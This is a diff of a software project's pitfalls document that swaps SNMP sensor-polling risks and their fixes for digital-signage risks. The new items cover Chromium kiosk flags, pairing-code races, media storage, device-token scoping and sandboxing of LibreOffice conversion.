-**What goes wrong:** Reference impl `app.py:243-246` has a guard: if `temp is None and hum is None`, skip the insert. **But** if a sensor has only `temperature_oid` set (no humidity), a single SNMP timeout yields `temp=None, hum=None` (because humidity is always None), and the guard kicks in — silently, the sensor appears to have no data ever, and the user can't tell from the DB whether it's "offline" or "misconfigured."
+**What goes wrong:** Videos don't autoplay (require user gesture); mouse cursor sits in the middle of the screen; if renderer crashes, tab shows "Aw, Snap!" until someone SSHes in.
 
-**Why it happens:** the offline-detection logic is tangled with the "no data" logic.
+**Why it happens:** Chromium kiosk defaults are browser-safe, not signage-safe.
 
-**Consequences:**
-- No way to render a "last contact: 3h ago" indicator without scanning the raw DB
-- The chart looks identical for "sensor unplugged" and "sensor responding with zero" (hard to troubleshoot)
-- Readings table grows slower than expected, so disk space monitoring underestimates
+**How to avoid — recommended full flag set for small-fleet signage on Pi 4:**
+```
+--kiosk
+--noerrdialogs
+--disable-infobars
+--disable-translate
+--disable-features=TranslateUI,InfiniteSessionRestore,AutofillServerCommunication
+--no-first-run
+--fast
+--fast-start
+--disable-pinch
+--overscroll-history-navigation=0
+--autoplay-policy=no-user-gesture-required
+--start-fullscreen
+--password-store=basic
+--check-for-update-interval=31536000
+--disable-session-crashed-bubble
+--disk-cache-dir=/home/signage/.cache/chromium
+--disk-cache-size=524288000         # 500 MB cap
+--incognito=false                   # need persistent cache for offline
+--enable-features=OverlayScrollbar
+```
+Cursor hide: install `unclutter-xfixes` and run `unclutter -idle 0.1 -root &` from the session startup — more reliable than CSS `cursor: none` (which still shows a cursor briefly on page transitions).
 
-**Prevention:**
-- **Two tables:** `sensor_readings` (only rows where at least one value succeeded) + `sensor_poll_log` (one row per poll attempt: sensor_id, attempted_at, success bool, error_kind enum, latency_ms). Keep poll_log trimmed (e.g. 7 days rolling).
-- Poll logic writes to poll_log *always*, to sensor_readings *only on success*.
-- Expose `GET /api/sensors/:id/status` = { last_success_at, last_attempt_at, consecutive_failures, last_error }. Chart UI can show "offline for 15 min" without touching sensor_readings.
-- Alembic migration creates both tables.
+Tab-crash recovery: wrap Chromium in a shell loop or use systemd `Restart=always`; add a client-side watchdog in the player that reloads on `visibilitychange` errors.
 
-**Phase mapping:** **Phase 39 (schema) MUST include both `sensor_readings` and `sensor_poll_log` tables. Phase 41 (API) includes `/status` endpoint.**
+**Warning signs:** Videos show a play button; cursor visible after hover; "Aw Snap!" persistent.
 
-**Confidence:** MEDIUM (pattern well-established in monitoring ecosystem, but we don't have a single canonical source — multiple prometheus/telegraf patterns converge on this shape).
-
----
-
-### M-5: TanStack Query refetchInterval fights the server-side poll
-
-**What goes wrong:** Naïve React implementation sets `refetchInterval: 60_000` on the `/api/sensors/:id/readings` query. But the server-side poll also runs at 60 s interval with no phase alignment. 50% of the time, the frontend fetches readings *just before* the new poll completes — the user sees a stale dataset, refreshes, sees the new one a second later, thinks the UI is laggy.
-
-**Why it happens:** `refetchInterval` is client-driven with no coordination with the server's polling cadence.
-
-**Consequences:** perceived UI lag; confused users who hit refresh twice.
-
-**Prevention:**
-- Use a shorter, out-of-phase `refetchInterval` on the readings query — e.g., 15 s when `/sensors` tab is visible. This is cheap (indexed range query) and guarantees the UI picks up new rows within 15 s of a server poll regardless of phase.
-- `refetchIntervalInBackground: false` — when the user leaves the `/sensors` tab, stop polling. TanStack Query default is `false` already, but set it explicitly as documentation.
-- `refetchOnWindowFocus: true` — matches the existing app pattern so the user returning to the tab sees fresh data without waiting.
-- `staleTime: 5_000` — re-queries within 5 s dedupe.
-- "Poll now" button uses `queryClient.invalidateQueries` on the readings key so the chart updates immediately after the manual poll returns.
-
-**Phase mapping:** **Phase 42 (frontend sensors page) — document these 4 TanStack Query settings in the hook that wraps the readings query.**
-
-**Confidence:** HIGH (TanStack Query v5 docs + existing project patterns in `frontend/src/hooks/`).
+**Phase to address:** Pi Provisioning Phase + Player Phase (watchdog + autoplay-friendly video tag with `muted playsinline autoplay`).
 
 ---
 
-### M-6: Alembic migration not idempotent / bad downgrade
+### Pitfall 12: 4K images blow up GPU memory on Pi 4
 
-**What goes wrong:** A hand-written Alembic migration for sensor tables has two easy traps: (a) `op.create_table` without `if_not_exists` — running `alembic upgrade head` twice on a partially-migrated DB fails; (b) `downgrade()` left as `pass` because "we never downgrade" — until a deployment needs to roll back v1.15 after discovering a UAT problem.
+**What goes wrong:** Admin uploads native 4K (3840×2160) photographs. Chromium decodes each into GPU memory; transitioning between two 4K images allocates ~120 MB of VRAM; Pi 4's shared GPU memory is typically 128–256 MB. Tab crashes or fades go janky.
 
-**Why it happens:** Speed pressure; developers assume migrations only run forward.
+**Why it happens:** No server-side downscale; client trusts whatever is uploaded.
 
-**Consequences:**
-- Stuck upgrade when a previous migration partially succeeded
-- No rollback path if v1.15 is released and has to be pulled
-- Directus bootstrap may fight with Alembic if the `sensors` table name collides with any future Directus collection (unlikely but possible)
+**How to avoid:**
+- Server-side **downscale and re-encode** on upload using Pillow/pyvips: generate a 1920×1080 (or 2560×1440) delivery variant alongside the original. The player fetches the variant; original is retained for download.
+- Strip EXIF; re-encode to `image/jpeg` quality 85 or `image/webp` quality 80.
+- Decorate `<img>` with `decoding="async" loading="eager"` and enforce `object-fit: contain` with `max-width: 100vw`.
 
-**Prevention:**
-- Migration `upgrade()` uses `op.execute("CREATE TABLE IF NOT EXISTS ...")` via SQL *or* runs a sanity check via `op.get_bind()` to verify the table doesn't exist before creation — mirrors the pattern used in v1.11 Directus-coexistence migrations.
-- Migration `downgrade()` explicitly drops both `sensor_readings` and `sensors` **plus** any indexes and unique constraints, in reverse dependency order.
-- Migration is tested: `alembic upgrade head && alembic downgrade -1 && alembic upgrade head` in a fresh DB during Phase 39 verification.
-- Seed data (if any) goes in a **separate** data migration file, not mixed with schema, so rollback separates cleanly.
-- Add `sensors, sensor_readings, sensor_poll_log` to the `DB_EXCLUDE_TABLES` env var in `docker-compose.yml` (Directus) so Directus doesn't auto-mount them in the Data Model UI.
+**Warning signs:** Memory pressure warnings in `chrome://gpu`; fades drop below 30 fps.
 
-**Phase mapping:** **Phase 39 (Alembic migration) — implement idempotent upgrade + full downgrade + round-trip test in verification.**
-
-**Confidence:** HIGH (Alembic docs + existing project patterns from v1.11 migration work).
+**Phase to address:** Conversion Phase (image variants) + Admin UI Phase (upload pipeline).
 
 ---
 
-### M-7: Index bloat on `sensor_readings(recorded_at)` under write-heavy workload
+### Pitfall 13: 6-digit pairing codes collide
 
-**What goes wrong:** Default Postgres autovacuum threshold is `autovacuum_vacuum_scale_factor = 0.2` — meaning autovacuum doesn't run until 20% of the table is dead tuples. On an insert-only workload (which time-series readings mostly are), there are no dead tuples, so **autovacuum rarely runs**. But btree indexes on monotonically-increasing columns (timestamp) can still bloat because of how btree splits work, and ANALYZE is also deferred — meaning the query planner's stats for `recorded_at` go stale, and range queries like `WHERE recorded_at >= now() - interval '24h'` may choose sequential scans over index range scans.
+**What goes wrong:** With only 10⁶ = 1,000,000 codes and human-readable (often excluding `0/O`, `1/I/l`) the effective space shrinks to ~500k. A race between two fresh Pis generates the same code; the admin claims "code 428193" and pairs the wrong device.
 
-**Why it happens:** insert-only workloads don't trigger the standard autovacuum knobs. It's a classic time-series-in-general-purpose-DB trap.
+**Why it happens:** No uniqueness check on generation; no TTL; no rate limit.
 
-**Consequences:**
-- Query latency on the readings endpoint degrades over months, not days — hard to notice in QA
-- Chart rendering slows from 50 ms to several seconds at the 100k-row mark
-- No alerts, because nothing "fails"
+**How to avoid:**
+- Generate codes with `secrets.choice` from a non-confusing alphabet (`23456789ABCDEFGHJKMNPQRSTUVWXYZ`, 31 chars, 6 positions = ~887M combinations).
+- Enforce `UNIQUE` constraint at the DB level on `pairing_codes.code` **only among unexpired rows** (partial index: `CREATE UNIQUE INDEX ... WHERE expires_at > now() AND claimed_at IS NULL`).
+- Short TTL (5–10 minutes); regenerate on expiry.
+- On collision, retry generation up to 5 times, then 500.
+- Rate-limit pairing-code generation per Pi source-IP (abuse prevention).
 
-**Prevention:**
-- Set per-table autovacuum tuning in the Alembic migration:
-  ```sql
-  ALTER TABLE sensor_readings SET (
-    autovacuum_vacuum_scale_factor = 0.05,
-    autovacuum_analyze_scale_factor = 0.02,
-    autovacuum_vacuum_insert_scale_factor = 0.1  -- Postgres 13+; triggers vacuum on insert volume
-  );
-  ```
-- Index strategy: composite btree on `(sensor_id, recorded_at DESC)` — matches the dominant query pattern `WHERE sensor_id = ? AND recorded_at >= ? ORDER BY recorded_at DESC LIMIT ?`. A single-column index on `recorded_at` alone is not needed and adds write overhead.
-- Capacity math and retention policy: at 60-second polling × 10 sensors × 2 values × 365 days = ~10.5 M rows/year. A ~30 B row × 10 M = ~300 MB. Add a **retention cleanup job**: `DELETE FROM sensor_readings WHERE recorded_at < now() - interval '90 days'` runs nightly via APScheduler. Document the retention period in the admin guide and make it admin-configurable only if needed.
-- After retention delete job runs, it issues `VACUUM (INDEX_CLEANUP ON) sensor_readings` explicitly — or relies on autovacuum now that dead tuples exist.
+**Warning signs:** Alembic migration history lacks the partial-unique index; admin reports "I paired the wrong device."
 
-**Phase mapping:** **Phase 39 (schema) sets per-table autovacuum knobs. Phase 40 (scheduler) adds the retention cleanup job.**
-
-**Confidence:** MEDIUM (Postgres vacuum docs + pganalyze writeups; actual bloat behavior is workload-dependent).
+**Phase to address:** Schema Phase (partial unique index) + Backend Phase (generation + TTL) + Player Phase (code refresh on expiry).
 
 ---
 
-### M-8: SQLite → Postgres one-off import — timezone mismatch and duplicate-key risk
+### Pitfall 14: Pairing race condition — Pi polls before or after admin claims
 
-**What goes wrong:** The reference impl's `data.db` stores `ts` as `INTEGER` Unix seconds (`app.py:151`). A naïve import script does `datetime.fromtimestamp(row["ts"])` and inserts into Postgres — but `fromtimestamp` on a machine in Europe/Berlin produces a naive local datetime, not UTC. Inserted into `timestamp with time zone`, Postgres interprets it as the session's `timezone` setting (UTC if set that way on the `api` container, Europe/Berlin if on the operator's laptop).
+**What goes wrong:** Pi displays code `ABC123`, polls `/api/signage/pair/status?code=ABC123` every 3 s. Admin enters code at second 2.7. Timing window:
+- Pi polls at 3 s → sees `pending` (admin's claim not yet committed).
+- Pi polls at 6 s → but admin's claim expired the code at 3.1 s (if naive) or another Pi somehow saw the code.
+Alternatively: admin claims; Pi never polls again because its network dropped; orphaned `device_token` never gets delivered.
 
-**Why it happens:** Unix seconds → datetime conversion has a subtle tz trap. `datetime.fromtimestamp(ts)` is local; `datetime.fromtimestamp(ts, tz=timezone.utc)` is UTC. The docs don't make this prominent.
+**Why it happens:** No durable state transitions; polling + claim not atomic.
 
-**Consequences:** imported historical readings are off by 1 or 2 hours vs. freshly-polled readings. Charts show a visible seam on the day of import.
+**How to avoid:**
+- State machine: `pending → claimed → delivered → active`. Do not expire on claim; expire only on TTL or explicit revoke.
+- Claim endpoint (admin): `UPDATE pairing_codes SET claimed_at=now(), claimed_by_user=:user, target_device_id=:new_device_id WHERE code=:code AND claimed_at IS NULL RETURNING ...`. Atomic.
+- Poll endpoint (Pi): returns `{status: claimed, device_token: ..., device_id: ...}` once; server marks `delivered_at` on response.
+- If `claimed_at` but not `delivered_at` after 10 min → alert admin "device did not come online" in UI.
+- Pi retains the code across reboots in `/var/lib/signage/pending.json` — if Pi reboots mid-pair, it resumes polling.
 
-**Prevention:**
-- Decision: **skip the one-off import**. The standalone app has limited history and the value of historical continuity doesn't justify the risk. Document this choice in the milestone summary.
-- If the decision is reversed and import is needed: the one-off script (in `backend/scripts/import_sqlite_readings.py`, run manually via `docker compose run --rm api python -m scripts.import_sqlite_readings`) MUST:
-  1. Use `datetime.fromtimestamp(ts, tz=timezone.utc)` — never the naive form.
-  2. Insert with `ON CONFLICT (sensor_id, recorded_at) DO NOTHING` — handles re-runs.
-  3. Run in a transaction, emit a summary at the end: N new rows, M conflicts skipped.
-  4. Be covered by a test against a fixture SQLite file.
-- Script is not wired into Alembic; it's a one-shot CLI.
+**Warning signs:** Admin UI shows "claimed but offline" devices accumulating; duplicate `device_id` rows.
 
-**Phase mapping:** **Phase 39 recommends SKIP import (documented decision). If reversed, Phase 44 adds the import script.**
-
-**Confidence:** HIGH (Python `datetime` docs are explicit on this + Postgres timestamptz semantics).
-
----
-
-## Minor Pitfalls
-
-### N-1: `getCmd` vs `nextCmd` confusion for single-OID reads
-
-**What goes wrong:** Reference impl correctly uses `getCmd` for single OID reads (`app.py:171`) and `nextCmd` for walks (`app.py:202`). A hurried port may flip these — `nextCmd` with a single OID returns the *next* OID in the tree, not the queried one, which looks "almost right" and only fails when the OID happens to be a leaf.
-
-**Prevention:**
-- Code comment at the `getCmd` call site: "# Single OID read — getCmd, NOT nextCmd. nextCmd walks past the queried OID."
-- Service unit test with a mock that returns a known OID tree; assert `snmp_get('1.3.6.1.2.1.1.1.0')` returns the sysDescr value, not sysObjectID.
-
-**Phase mapping:** Phase 38 service tests.
-
-**Confidence:** HIGH (SNMP protocol fundamentals).
+**Phase to address:** Schema Phase + Backend Phase + Player Phase (persistent pairing state).
 
 ---
 
-### N-2: Raw-int scale factor bugs (reference impl already handles this)
+### Pitfall 15: Directus file storage path vs. URL mismatch
 
-**What goes wrong:** Many temp/humidity sensors return `235` meaning 23.5°C — scaled by 10. The reference impl already has `temperature_scale: float` in config and divides by it (`app.py:238`). Pitfall: confusion about direction. If the sensor returns the raw value and the user enters `scale=10`, the code computes `raw / scale = 23.5`. If the user thinks "scale" means "multiplier" and enters `scale=0.1`, the code computes `235 / 0.1 = 2350`. Classic UI meaning trap.
+**What goes wrong:** Developer assumes `directus_files.filename_disk` is relative to a known path. In fact Directus stores files under `<STORAGE_LOCAL_ROOT>/<uuid>` (or S3 key). Backend tries to `open()` the uploaded PPTX at the filename; `FileNotFoundError`.
 
-**Prevention:**
-- Label the admin config field "Divisor (raw value ÷ this = display value)" with a helper tooltip "e.g. 10 for a sensor reporting 235 as 23.5°C".
-- Validate scale ∈ {0.01, 0.1, 1, 10, 100, 1000} via Pydantic `Literal`, OR freeform with a realistic-range assertion on computed output (e.g., reject if scaled temp < -50 or > 100°C).
-- "Probe OID" admin endpoint (already in reference impl at `app.py:434`) shows the raw value — lets the admin dial in the scale by comparing raw to the sensor's displayed reading.
+**Why it happens:** Directus abstracts storage; `filename_disk` is the disk-side key, not a path relative to `/uploads`. URL is `/assets/<uuid>` served by Directus, not the backend.
 
-**Phase mapping:** Phase 41 (admin API) and Phase 42 (admin UI tooltip copy).
+**How to avoid:**
+- **Option A (recommended):** Do not read Directus files from disk. Have the admin UI upload media **directly to the FastAPI backend**, which stores the bytes under a backend-owned volume (e.g. `/app/media/<uuid>.<ext>`). Directus is used only for the `media` table metadata (joined via `directus.items(...)` or direct SQL).
+- **Option B:** Share the Directus upload volume between both containers (`volumes: - directus_uploads:/app/uploads:ro` on api, read-only). Backend reads by `filename_disk`.
+- Either way: **never** store user-facing URLs that reference Directus's internal UUID paths — add a stable backend URL like `/api/signage/media/<id>/file` that internally resolves.
 
-**Confidence:** HIGH (direct inspection of reference impl).
+Option A cleanly separates concerns (Directus is just auth + UI chrome here, not the file store) and aligns with the v1.11 precedent where Alembic owns app schema and Directus is deliberately kept shallow.
 
----
+**Warning signs:** Conversion worker throws `FileNotFoundError`; media URLs break when Directus is restarted or migrated.
 
-### N-3: UDP packet loss misdiagnosed as sensor offline
-
-**What goes wrong:** SNMP over UDP can lose single packets silently (no TCP retransmit). A transient loss → `timeout=3, retries=1` (reference impl default, `app.py:175`) → one poll cycle reports None. A strict "1 failure = offline" rule turns transient network hiccups into false offline alerts.
-
-**Prevention:**
-- Use `retries=2` (3 total attempts) with `timeout=2` — total max wait 6 s still fits in a 60 s cycle.
-- Offline threshold: **3 consecutive** failed polls before marking offline in the UI. Tracked in-memory on the poll service (or via `sensor_poll_log` M-4). This handles 99.9%+ of transient UDP loss.
-- Do not alert-email on a single failure; only after N failures. No email alerting in scope for v1.15 anyway, so this is future-proofing guidance.
-
-**Phase mapping:** Phase 38 (SNMP client default), Phase 41 (status endpoint threshold).
-
-**Confidence:** HIGH (SNMP/UDP protocol + standard monitoring patterns).
+**Phase to address:** Schema Phase (decide storage strategy) + Backend Phase (upload endpoint) + Admin UI Phase (upload form targets `/api/signage/media` not Directus `/files`).
 
 ---
 
-### N-4: Concurrent polls of same host within one cycle
+### Pitfall 16: Deleting a media item in the admin UI orphans the underlying file
 
-**What goes wrong:** A sensor with both `temperature_oid` and `humidity_oid` results in two sequential SNMP GETs in the reference impl (`app.py:235-242`). That's fine for N=1 sensor. But if `poll_all` uses `asyncio.gather` across *sensors*, and a single physical host owns two *configured* sensors (e.g. someone splits one AKCP device into two rows for readability), the host gets two simultaneous UDP GETs — a well-written SNMP agent handles this, but cheap ones drop one.
+**What goes wrong:** Admin deletes "Lobby Welcome.mp4" from the signage library. Row removed from `media` table. Underlying 80 MB file still sits on disk. After 6 months, disk full.
 
-**Prevention:**
-- Keep the "one sensor = one host" convention in the admin UI. Discourage splitting a host into multiple sensor rows in the admin guide.
-- If multi-OID-per-host becomes common: introduce `getBulk` (pysnmp: `bulkCmd`) to fetch all OIDs in a single request — more efficient and no concurrency concern. Defer to a future milestone.
+**Why it happens:** Foreign-key cascade handles rows, not side-effect files.
 
-**Phase mapping:** Phase 43 (admin guide convention). Not a blocker for v1.15.
+**How to avoid:**
+- Backend `DELETE /api/signage/media/:id` route: in a single transaction, delete DB row, then delete file from disk (`os.unlink`, ignore `FileNotFoundError`), then delete derived artifacts (PPTX→image slides, PDF→image pages).
+- If a playlist references the media item, refuse deletion with 409 and list blocking playlists (RESTRICT FK) — do not silently orphan playlist_items either.
+- Nightly cleanup job: enumerate files on disk, compare to `media.filename_disk` set; delete files with no DB row older than 24 h (grace period avoids races with in-flight uploads).
 
-**Confidence:** MEDIUM (cheap-SNMP-agent behavior varies; many agents are fine with concurrent requests).
+**Warning signs:** `du -sh /app/media` grows faster than `count(*) from media`.
 
----
-
-### N-5: APScheduler in-memory job store loses scheduled state on restart
-
-**What goes wrong:** The existing Personio scheduler uses the default `MemoryJobStore` (evident from `scheduler.py` — no job store configured). Container restart = all scheduled jobs re-registered from DB config at startup. This is fine for interval jobs (the lifespan re-registers on boot) but means "I'll poll at 14:00 sharp" state is lost on any restart.
-
-**Prevention:**
-- We're using interval triggers, not `DateTrigger` / `CronTrigger` with specific times, so the impact is minor — worst case is a single skipped poll cycle around a container restart.
-- Accept this as a known limitation matching the existing Personio pattern. Documented in Phase 40 plan.
-- Do NOT introduce a SQLAlchemyJobStore just for this — it would require a separate sync engine against the same Postgres, complicating the async-only convention.
-
-**Phase mapping:** Phase 40 — document in plan, no code change.
-
-**Confidence:** HIGH (APScheduler docs + existing project pattern).
+**Phase to address:** Backend Phase (delete semantics) + Admin UI Phase (confirm dialog + "in use by N playlists" warning) + Schema Phase (FK `ON DELETE RESTRICT` on `playlist_items.media_id`).
 
 ---
 
-### N-6: Pydantic validation errors echoing secrets
+### Pitfall 17: Permissions issues on shared volume between containers
 
-**What goes wrong:** If `/api/sensor-config` receives an invalid payload, FastAPI's default `RequestValidationError` handler echoes the offending values in the 422 response body. If the community string was the invalid field (e.g., too long), it gets echoed back to the browser and possibly logged.
+**What goes wrong:** Directus container runs as UID 998; api container runs as UID 1000. Backend tries to write a derived image next to the original PPTX → `PermissionError`. Or Directus uploads a file → backend can read but cannot delete during media removal.
 
-**Prevention:**
-- Use Pydantic `SecretStr` for the `community` field — its `__repr__` is `"**********"` so validation error echoes are already redacted.
-- FastAPI global exception handler for `RequestValidationError` that strips any field named `community`, `password`, `token`, `secret` from the error detail before returning. Already present in several FastAPI boilerplate projects; confirm presence or add in Phase 41.
+**Why it happens:** Docker named volumes preserve UIDs; no automatic harmonization.
 
-**Phase mapping:** Phase 41 (API) — use SecretStr + optional global handler.
+**How to avoid:**
+- If using Option A (backend-owned storage, per Pitfall 15), volume is owned by the api container's UID — no conflict. Recommended.
+- If sharing: in the api Dockerfile, create a user with the same UID as Directus's internal user (`useradd -u 998 app`), or vice versa. Document this UID lock in `docker-compose.yml` with a comment.
+- Avoid `chown -R` in entrypoints — slow on large volumes.
 
-**Confidence:** HIGH (Pydantic + FastAPI docs).
+**Warning signs:** Intermittent `PermissionError` in logs; `ls -la` on the shared volume shows mixed UIDs.
 
----
-
-### N-7: `SensorPayload.community` default `"public"` in the admin UI
-
-**What goes wrong:** Reference impl ships with `community: str = "public"` as the admin form default (`app.py:334`). "public" is the industry-standard default community string — every scanner on the internet tries it first. If the sensor host is ever reachable from outside the LAN (now or future), this is a disclosure bug.
-
-**Prevention:**
-- No default on the admin form. Admin must type it. Pydantic: `community: SecretStr` with no default, `Field(..., min_length=1)`.
-- Admin-guide warning: "Never leave the default 'public' community on a production device."
-
-**Phase mapping:** Phase 41 (API schema) + Phase 43 (admin guide warning).
-
-**Confidence:** HIGH (SNMP security guidance is universal on this).
+**Phase to address:** Backend Phase / Infra sub-phase. Verification: `docker compose exec api touch /app/media/test && docker compose exec directus rm /app/media/test` succeeds.
 
 ---
 
-## Phase-Specific Warnings Summary
+### Pitfall 18: Browser cache is not a reliable offline store on Pi kiosks
 
-| Phase | Topic | Pitfall IDs | Must-do |
-|-------|-------|-------------|---------|
-| **38** | SNMP client service | C-1, C-2, C-6, C-8, M-3, N-1, N-3 | Shared SnmpEngine; AsyncSessionLocal only; `snmpget` verification from container; v3arch.asyncio import; per-sensor exception boundary |
-| **39** | Alembic schema + encryption | C-3, C-5, M-4, M-6, M-7, M-8 | Fernet-encrypted community; unique constraint (sensor_id, recorded_at); both sensor_readings + sensor_poll_log tables; idempotent up + full downgrade; per-table autovacuum knobs; document "no import" decision |
-| **40** | APScheduler integration | C-4, C-7, M-7, N-5 | max_instances=1, coalesce=True, misfire_grace_time=30; outer asyncio.wait_for; --workers 1 comment; retention cleanup job; document in-memory jobstore limitation |
-| **41** | API routes + admin config | M-1, M-2, M-4, N-2, N-6, N-7 | require_admin at router level + audit test; log interval transitions; /status endpoint; SecretStr community with no default; no "public" default |
-| **42** | Frontend /sensors page | M-1 (verify), M-5 | Viewer cannot see tile; refetchInterval=15s, refetchIntervalInBackground=false, refetchOnWindowFocus=true, staleTime=5s |
-| **43** | Admin guide article | C-3, C-6, M-2, N-3, N-4, N-7 | Community-as-secret; host-mode fallback; interval-gap note; "1 host = 1 sensor" convention; never-use-public warning |
-| **44** (optional) | One-off SQLite import | M-8 | If enabled: UTC-aware fromtimestamp + ON CONFLICT DO NOTHING + fixture test |
+**What goes wrong:** Developer relies on HTTP cache headers (`Cache-Control: max-age=604800`) for offline playback. Chromium evicts the cache under memory pressure or on restart; Pi reboots nightly (common practice); cache is empty → black screen when network is down.
+
+**Why it happens:** HTTP cache is a performance tool, not a persistence tool. Eviction policy is not developer-controllable.
+
+**How to avoid — file-based cache on the Pi:**
+- Install a tiny Python or Node sidecar service on the Pi (same systemd, before Chromium) that:
+  1. Polls `/api/signage/playlist?device_token=...` every 30 s.
+  2. Writes manifest JSON to `/var/lib/signage/playlist.json`.
+  3. Downloads each referenced media file to `/var/lib/signage/media/<id>.<ext>` if not present (ETag/size check).
+  4. Garbage-collects files no longer in the manifest after a 7-day grace.
+- The player page loads the manifest via `file:///var/lib/signage/playlist.json` or via a tiny `localhost:8080` static file server the sidecar runs. When online, it overlays with the live API; when offline, it falls back to the local cache.
+- Do **not** use Service Workers for this — they require HTTPS on non-localhost (painful on LAN-only deployments without internal CA + cert distribution) and cache quota is still browser-managed.
+- Signal offline explicitly: sidecar writes `online=true/false` to a status file; player renders a discreet corner indicator when offline for ops visibility (not user-visible normally).
+
+**Warning signs:** Pi behind a broken Wi-Fi shows black screen rather than looping cached content.
+
+**Phase to address:** Pi Provisioning Phase (sidecar) + Player Phase (manifest-driven playback) + Docs Phase (sidecar architecture).
+
+---
+
+### Pitfall 19: Alembic/Directus schema-ownership race at deployment
+
+**What goes wrong (v1.11 lesson restated for signage):** `docker compose up` starts `migrate` and `directus` in parallel. Directus runs schema introspection; if signage tables already exist but its `directus_collections` snapshot doesn't, it may try to re-register them or present them for deletion in the admin UI. Alternately: Directus starts first on a fresh DB, creates its own tables, then Alembic finds an unexpected state.
+
+**Why it happens:** Directus introspects the entire PG schema on boot; order matters.
+
+**How to avoid:**
+- `depends_on` with `condition: service_completed_successfully` on the `migrate` one-shot service for both `api` and `directus`. Directus must not start until Alembic finishes.
+- Extend `directus/snapshot.yml` with explicit "hide" entries for each new signage table (`media`, `playlists`, `playlist_items`, `devices`, `device_tags`, `pairing_codes`, `device_heartbeats`) — follows the v1.11 pattern keeping Alembic as schema source of truth.
+- Adding tables during live deployment: run Alembic migration manually via `docker compose run --rm migrate` before `docker compose up -d api directus`. Do not rely on a rolling restart to order things correctly.
+
+**Warning signs:** Directus admin UI shows new signage tables as "collections to configure"; Alembic history inconsistent; `alembic current` on restart differs from `alembic heads`.
+
+**Phase to address:** Schema Phase + Docs Phase (deployment runbook update).
 
 ---
 
-## Cross-Cutting Prevention Patterns
+### Pitfall 20: Missing DE keys surface at runtime (v1.15 lesson)
 
-Four patterns, if enforced consistently, prevent most pitfalls above. Phase plans should reference these:
+**What goes wrong:** Signage admin UI labels like `signage.media.uploadTitle` exist in `en.json` but not in `de.json`. A German-locale admin sees `signage.media.uploadTitle` literal on screen. Embarrassing; caught only by manual DE smoke test.
 
-1. **Shared pysnmp engine, per-engine MIB loading** — `app.state.snmp_engine`, initialized once. (addresses C-1, C-8)
-2. **AsyncSessionLocal everywhere, grep-enforced no-sync-DB** — matches existing Personio pattern. (addresses C-2)
-3. **Admin gate at router level, not per-endpoint** — matches existing Directus-integrated routers. (addresses M-1)
-4. **Two-table polling schema** (`sensor_readings` + `sensor_poll_log`) — separates "data" from "liveness." (addresses C-5, M-4, N-3)
+**Why it happens:** Developer adds keys to `en.json` while iterating; forgets the DE parity pass until the end; CI doesn't enforce parity.
+
+**How to avoid:**
+- Add a CI script (extend the v1.13 pattern): `scripts/check-i18n-parity.mjs` — parses both locale files, diffs key sets, exits non-zero on asymmetry. Wire into the pre-commit hook.
+- Admin-facing signage UI needs **full DE/EN parity**; player UI is media-driven and intentionally text-free, so i18n scope is limited to admin surfaces + a small handful of player status overlays (pairing code, "Offline", loading state).
+- Author DE keys in the informal "du" tone (project convention).
+
+**Warning signs:** Runtime console warnings `i18next::translator: missingKey de translation signage.*`; visual regressions in DE screenshots.
+
+**Phase to address:** Admin UI Phase + Docs Phase (admin guide DE/EN). Verification: CI parity check green; run UI in `lang=de` and eye-check all signage screens.
 
 ---
+
+### Pitfall 21: Device token leaks cross-device playlist data
+
+**What goes wrong:** Backend route `/api/signage/playlist?device_token=...` returns the playlist for the token's device. Developer naively implements it as `SELECT * FROM playlists JOIN ... WHERE device_token = :token` — but forgets to scope media items, or returns the token's `device_id` in a way that lets a curious device enumerate others via `/api/signage/devices/:id`.
+
+**Why it happens:** Device tokens feel "server-to-server" but they live on a $50 Pi that could be physically stolen.
+
+**How to avoid:**
+- Device tokens: short-lived JWT (24 h) signed with HS256, claims `{sub: device_id, scope: "device", iat, exp}`. **Scope is enforced at every route** — a device token can ONLY hit `/api/signage/player/*` routes (playlist fetch, heartbeat, media file download). 403 on admin/other-device routes.
+- **Rotation:** on each heartbeat, if token is within 2 h of expiry, issue a fresh one in the response body (`{heartbeat_ack, new_token?}`). Pi persists the new token. Old tokens revoked after a 1-h grace (overlap).
+- Physical-theft mitigation: admin UI has "Revoke device" button → sets `devices.revoked_at = now()`; middleware rejects tokens for revoked devices.
+- Media downloads signed with a per-request short-lived token derived from the device token — prevents token-less URL sharing.
+
+**Warning signs:** Tokens never change; security audit finds `device_token` in Git log; device that was physically lost still reaches the API.
+
+**Phase to address:** Backend Phase (auth middleware) + Admin UI Phase (revoke button) + Player Phase (token rotation).
+
+---
+
+### Pitfall 22: Malicious PPTX exploits LibreOffice CVE
+
+**What goes wrong:** Admin uploads an attacker-supplied PPTX that triggers a LibreOffice heap overflow (CVE-2024-xxxx class); RCE inside the conversion container. From there, network reach to Directus DB.
+
+**Why it happens:** LibreOffice has a long history of file-parsing CVEs; internal-use assumption is weaker than users think.
+
+**How to avoid:**
+- Run the conversion worker in a **dedicated container** (not the api container): minimal base image, no network access to Directus or DB, only a one-way write to a shared `media` volume and read from an `uploads` volume.
+- `read_only: true` rootfs with `tmpfs` for `/tmp` in `docker-compose.yml`.
+- `security_opt: ["no-new-privileges:true"]`, `cap_drop: [ALL]`.
+- Keep LibreOffice patched — tie Dockerfile to `debian:stable-slim` (auto security updates on rebuild).
+- Even for "admin-only upload": a compromised admin laptop is a valid threat model.
+
+**Warning signs:** CVE-2024/2025/2026 LibreOffice advisories not tracked; no network segmentation between conversion and DB.
+
+**Phase to address:** Conversion Phase (container hardening) + Docs Phase (security section).
+
+---
+
+### Pitfall 23: iframe embeds break via X-Frame-Options / CSP
+
+**What goes wrong:** Admin creates a "Web URL" media item pointing to `https://some-dashboard.example.com`. Player loads it in an iframe; browser blocks with `Refused to display in a frame because an ancestor violates the following Content Security Policy directive: "frame-ancestors"`. Black square on the signage screen.
+
+**Why it happens:** Many sites send `X-Frame-Options: DENY` or `SAMEORIGIN`, or CSP `frame-ancestors 'none'`. The signage player cannot override headers sent by the target server.
+
+**How to avoid:**
+- **Admin UI pre-flight check:** when adding a Web URL, backend issues a `HEAD` request, inspects headers, and warns "This site may refuse embedding" if `X-Frame-Options` is present or CSP blocks embedding.
+- For trusted internal dashboards: the site owner must explicitly allow your signage origin (`Content-Security-Policy: frame-ancestors https://signage.internal`). Document this requirement in the admin guide.
+- Fallback: offer a "screenshot mode" — server-side headless-Chromium snapshot every N minutes, displayed as an image. Out of scope for v1.16 but worth noting for v1.17.
+
